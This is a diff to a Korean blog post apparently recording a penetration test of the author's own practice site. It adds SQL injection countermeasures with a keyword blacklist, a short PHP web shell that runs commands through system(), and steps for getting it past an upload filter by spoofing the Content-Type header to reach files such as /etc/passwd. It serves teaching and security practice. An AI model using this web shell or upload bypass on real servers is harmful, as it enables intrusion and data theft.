@@ -1,11 +1,11 @@
 ---
 layout: post
-title:  "⚫ 모의해킹 사이트 구축 & 웹 침투 테스트"
+title:  "⚠모의해킹 사이트 구축 & 웹 침투 테스트"
 date:   2021-08-31 15:54:50 +0700
 categories: "모의해킹"
-tags: [ php, mariadb, xss, csrf, webshell]
-description: 네이버에서 날씨를 검색해 나오는 데이터 정보들을 쉽게(파싱) 사용할 수 있도록 간단하고 쉽게 제공해 주는 API를 만들어 보았습니다. "이 API는 JSON 포맷의 응답을 전송합니다."
-image: "https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcVNmm8%2FbtrdEjeFK6C%2FSb271UmoPaBwntvxpKDAOK%2Fimg.png"
+tags: [ PHP, Mariadb, XSS, CSRF, Web Shell. Directory Listing, Blind SQL Injection]
+description: 모의해킹 사이트를 통해 "
+image: "https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png"
 ---
 # 0. 목차
 1. 개요<br>1.1 사이트 목적
@@ -255,6 +255,26 @@ print(Member_name)
 
 저는 시간을 단축하기 위해 위의 7~9번 사진처럼 공격 스크립트 `파이썬`을 이용하여 작성 후 공격하여 `원하는 결과값`을 얻을 수 있엇습니다.
 
+#### 대응 방안
+<mark>시큐어 코딩 (입력값 유효성 검사 및 화이트리스트 방식)</mark>
+<br>
+<br>1) 블랙 리스트 방식
+<br>SQL 쿼리의 구조를 변경시키는 문자나 키워드를 제한하는 방식이다. <br>아래와 같은 문자를 블랙리스트로  미리 정의하여 해당 문자를 공백 등으로 치환하는 방식으로 방어한다.
+
+DBMS 종류에 따라 쿼리의 구조를 변경시키거나 쿼리문의 일부로 사용되는 문자 필터링
+
+```sql
+(특수문자) ' , " , = , & , | , ! , ( , ) , { , } , $ , % , @ , #, -- 등
+(예 약 어) UNION, GROUP BY, IF, COLUMN, END, INSTANCE 등
+(함 수 명) DATABASE(), CONCAT(), COUNT(), LOWER() 등
+```
+<br>
+2) 화이트 리스트 방식
+블랙리스트 방식보다 보안성 측면에서는 훨씬 강력한 방법이다. <br>블랙리스트 방식에서는 금지된 문자 외에는 모두 허용하지만 화이트리스트 방식에서는 허용된 문자를 제외하고는 모두 금지하는 방식이다. 
+
+
+
+
  <hr>
 ## 4-2 <sup id="xss">[[3]](#user-ref3)</sup> `XSS` `: Cross Site Scripting`
 
@@ -411,69 +431,100 @@ XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`
 <hr>
 ## 4-4 <sup id="webshell">[[7]](#user-ref7)</sup> `Web Shell`
 
-1. 웹쉘은 말 그대로 웹사이트를 통해 쉘(shell)을 여는 공격 입니다.
-2. 원격에서 웹서버에 명령을 수행할 수 있도록 작성한 웹 스크립트 (ASP, JSP, PHP, CGI 파일 등) 형태를 가짐
-3. 웹 서버의 다양한 취약점 (서버 취약점, 웹 어플리케이션 취약점) 등을 타깃으로 공격하여 웹 서버에 웹쉘을 업로드한 후<br>일반적인 웹 브라우저 (80 Port)를 통하여 업로드한 웹쉘을 실행하여 침투한 서버상의 정보 유출 및 변조, 악성코드 유포 등의 불법 행위를 행하는 형태가 많음
+1. 웹쉘은 말 그대로 웹사이트를 통해 `쉘(shell)을 여는 공격` 입니다.
+2. 원격에서 웹서버에 `명령을 수행`할 수 있도록 작성한 웹 스크립트 (ASP, JSP, PHP, CGI 파일 등) 형태를 가짐
+3. 웹 서버의 다양한 취약점 (`서버 취약점, 웹 어플리케이션 취약점`) 등을 타깃으로 공격하여 웹 서버에 웹쉘을 업로드한 후<br>일반적인 웹 브라우저 (80 Port)를 통하여 업로드한 웹쉘을 실행하여 침투한 서버상의 `정보 유출 및 변조, 악성코드 유포` 등의 불법 행위를 행하는 형태가 많음
 
 이번에도 `게시판`을 통해 `Web Shell` 공격이 가능한지 확인해보겠습니다.
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbWJyh1%2Fbtrd22XMdp5%2FWy6ByH8wcJu8usZFOuTv51%2Fimg.png
 " alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 26. 파일 업로드 확인 (1/3)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdmXSiq%2Fbtrd1zvgbKa%2Fu7s5Y4W1tBbNHSgTGwW3MK%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 27. 파일 업로드 확인 (2/3)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbyiLcF%2FbtrdZWdTA6i%2F3yOPDs2Uh73O2gMcDniAjK%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 28. 파일 업로드 확인 (3/3)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F27sNp%2Fbtrd14IxI5t%2FAL9Wkve4Pp1Cwoez5Qvpjk%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 29. Web Sehll 공격 (1/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbdQKS8%2FbtrdZVst5GP%2FkTMGb8EDpXYPOXKScnpgNk%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 30. Web Sehll 공격 (2/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FclHe3H%2Fbtrd1xRKaoj%2FekxHDOk9M0FipXv9bA1KVK%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 31.Web Sehll 공격 (3/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FZquWV%2Fbtrd2yQaBaP%2FaXvtPCtTfJNvuwMnzqgv01%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 32. Web Sehll 공격 (4/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzwmyJ%2Fbtrd0jzVjP6%2F9yEUEVUT3c1cS5giEhUqzk%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 33. Web Sehll 공격 (5/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcmb0J4%2Fbtrd0ywQElW%2FAl7yg7nDOOB7eushxfECXK%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 34. Web Sehll 공격 (6/7)</figcaption>
 </figure>
 
 <figure>
 <img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcDhOXg%2Fbtrd0jmmgyR%2Fa5C9dRTM6S0y0KJmHUqeFK%2Fimg.png" alt="Weather API Web Sites - Main">
-<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+<figcaption>Fig 35. Web Sehll 공격 (7/7)</figcaption>
 </figure>
 
+```php
+<?php
+//
+// PoC: a simple webshell 
+// Author: Bonghwan Choi
+//
 
+echo 'Enter a Command:<br>';
+echo '<form action="">';
+echo '<input type=text name="cmd">';
+echo '<input type="submit">';
+echo '</form>';
+
+if (isset($_GET['cmd'])) {
+	system($_GET['cmd']);
+}
+?>
+```
+<figcaption>Web Shell 공격 코드</figcaption>
+
+현재 `파일 업로드`를 통해 `Web Shell`이 이루어지고 있다.
+<br>정상적인 파일업로드라면 `이미지 확장`(png, jpg, bmp등)만 이루어지게 되어 있거나, `블랙리스트 기반 파일 확장자`(php, asp, jsp)는 `필터링`이 되어있다. 
+<br>전 여기서 공격을 하기 위해 피들러를 이용하여 `요청`(Request) `변조하여 Content-type를 우회`해서 
+Content-Type:application/x-php가 아닌 `Content-Type:image/jpeg`로 속여 업로드를 한 후 미리 작성해둔 Web Shell 공격코드를 통해 (etc/passwd)등의 `시스템 파일`등등 `접근 시도`가 가능합니다.
 <hr>
+
 ## 4-5 `Directory Listing`
 
 1. 디렉토리 리스팅이란 웹서버를 `디렉토리`로 `접속`할 때, 해당 디렉토리내의 `파일과 디렉토리`를 `리스트`로 보여주는 기능을 말합니다.
-
+2. 디렉터리 리스팅 취약점은 `브라우징 하는 모든 파일`을 보여준다. 
+<br>원래의 목적은 문서의 공유로 파일 탐색기처럼 `원하는 문서`로 바로 찾아갈 수 있게 하는 용도였지만 최근에는 문서의 저장 및 열람이 가능하다면 문서의 `취약점(백업파일 및 소스코드, 스크립트 파일의 유출로 인한 계정 정보 유출 등등)`을 이용해 `악의적인 목적`을 갖고 있는 사람들에게 `탈취 및 웹서버 공격`이 이루어진다.
+<BR>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FSVInk%2Fbtrd14IFX1V%2FR9TKQadHo0uUJoh5NwAk8k%2Fimg.png" alt="Weather API Web Sites - Main">
+<figcaption>Fig 36. 디렉토리 리스팅</figcaption>
+</figure>
+html 페이지의 소스보기를 할 수 있을때, 이미지 및 파일의 경로가 적혀있는 부분이 있다. 여기서 URL 부분에 파일명을 지우고 입력하면 다음과 같이 파일리스트를 볼 수 있습니다.
 
 <hr>
 
@@ -511,9 +562,9 @@ limit 함수는 문자열의 길이를 반환한다. 문장열의 길이를 알�
 <small id="user-ref7"><sup>[[7]](#webshell)</sup>※쉘(shell) : 사용자에게 받은 지시를 해석하여 하드웨어 지시어로 바꿈으로써 운영체제의 커널과 사용자 사이를 이어주는 것</small>
 <br>
 <br>
-<small id="user-ref8"><sup>[[8]](#Directory Listing)</sup> Sㅁ</small>
 <hr>
 
 # 6. 참고자료
 https://lucete1230-cyberpolice.tistory.com/94
-https://velog.io/@codren/%EC%9B%B9-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%A4%EC%8A%B5-2-CSRF
+<br>https://velog.io/@codren/%EC%9B%B9-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%A4%EC%8A%B5-2-CSRF
+<br>https://websecurity.tistory.com/125
